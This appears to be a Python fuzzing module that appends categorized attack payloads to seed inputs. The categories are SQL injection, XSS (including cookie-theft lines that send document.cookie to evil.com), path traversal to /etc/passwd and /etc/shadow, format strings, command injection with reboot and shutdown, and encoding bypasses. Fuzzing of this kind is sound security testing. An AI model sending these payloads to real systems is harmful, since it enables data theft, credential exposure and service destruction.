import random

def mutate(seed):
    mutations = [
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "../../../../etc/passwd",
        "A" * 500,
        "%00%00%00",
    ]
    return seed + random.choice(mutations)

def mutatev2(seed, selected_category="ALL"):

    """Kombiniert den Seed mit allen Mutationen aus allen Kategorien.
    Gibt Tupel (Kategorie, mutierter_payload) zurück."""

    categories = {
        "SQLi": [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' OR 1=1 --",
            "' UNION SELECT NULL--",
            "' UNION SELECT username, password FROM users--",
            "' OR 'a'='a' /*",
            "\" OR \"\"=\"\"",
            "admin' --",
            "' AND SLEEP(5)--",
            "1' OR 1=1 LIMIT 1; --",
            "' OR 1=1#",
            "1; SELECT pg_sleep(5); --"
        ],
        "XSS": [
            "'\"><script>alert(1)</script>",
            "\" onmouseover=\"alert(1)",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<body onload=alert(1)>",
            "<video src onerror=alert(1)>",
            "<script>document.location='http://evil.com?cookie='+document.cookie</script>",
            "<img src=x onerror=\"fetch('http://evil.com?c='+document.cookie)\">",
            "<iframe srcdoc=\"<script>alert('stored')</script>\"></iframe>",
            "javascript:alert(1)",
            "javascript:eval('alert(1)')",
            "javascript:prompt(1)",
            "#<script>alert(1)</script>",
            "?q=<svg/onload=alert(1)>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<img src=x o%6ener%72=alert(1)>",
            "<svg><script xlink:href='javascript:alert(1)'></script>",
            "<svg><a xlink:href=\"javascript:alert(1)\">CLICK</a></svg>",
            "%3cscript%3ealert(1)%3c%2fscript%3e",
            "<scr\0ipt>alert(1)</scr\0ipt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>setTimeout('alert(1)',100)</script>",
            "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></iframe>",
            "<math><mi//xlink:href=\"javascript:alert(1)\"></math>"
        ],
        "Traversal": [
            "../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "/../../../boot.ini",
            "../../../../../../../../etc/shadow",
            "../" * 10 + "etc/passwd",
            "..%c0%af..%c0%afetc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            ".../...//.../...//etc/passwd"
        ],
        "Format": [
            "%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n",
            "{}{}{}{}{}{}{}{}{}{}",
            "{0}{0}{0}{0}{0}",
            "\x00\x00\x00\x00\x00\x00",
            "%s%s%s%s%s%s%s%s%s",
            "%.1024x"
        ],
        "CommandInjection": [
            "ls -la",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; ls -la",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| ls",
            "|| ping -c 5 127.0.0.1",
            "`reboot`",
            "|| shutdown -h now"
        ],
        "Unicode/Encoding": [
            "%u002e%u002e%u002f",
            "%c0%ae%c0%ae%c0%af",
            "%2e%2e%2f",
            "%uff0e%uff0e%u2215",
            "%e0%80%ae%e0%80%ae",
            "\\u002e\\u002e\\u002f",
            "%25%32%65%25%32%65%25%32%66"
        ],
        "Length": [
            "A" * 10,
            "A" * 100,
            "A" * 1000,
            "A" * 5000,
            "9" * 1000,
            "0x" + "F" * 1000,
            "<div>" + "A" * 10000 + "</div>",
            "%s" * 1000,
            "\x00" * 1000,
            "🦄" * 1000,
        ]
    }

    all_mutations = []

    for category, mutation_list in categories.items():
        if selected_category != "ALL" and category != selected_category:
            continue
        for mutation in mutation_list:
            payload = seed + mutation
            all_mutations.append((category, payload))

    return all_mutations

def mutatev3(seed, filepath):

    try:
        with open(filepath, "r", encoding="utf-8") as file:
            file_payloads = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[!] File not found: {filepath}")
        return []

    all_mutations = []

    for mutation in file_payloads:
        payload = seed + mutation
        all_mutations.append(("FILE", payload))

    print(f"[+] Loaded {len(all_mutations)} payloads from {filepath}")
    return all_mutations